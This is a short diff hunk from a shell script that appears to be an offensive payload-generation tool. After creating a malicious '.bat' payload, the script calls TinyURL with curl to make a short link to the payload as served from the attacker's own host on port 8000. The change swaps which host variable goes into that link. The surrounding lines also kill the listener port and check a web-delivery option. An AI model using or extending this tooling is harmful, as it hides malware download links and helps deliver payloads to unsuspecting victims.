@@ -53,7 +53,7 @@ makepayload
 pid=$!
 wait $pid
 printf '\e[0;32m Payload saves as: \e[0;31m %s\n \e[0m' "$payload.bat"
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$default_lhost:8000/$payload.bat)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$lhost:8000/$payload.bat)
 fuser -k 8000/tcp
 
 if [ "$web" = 'y' ]
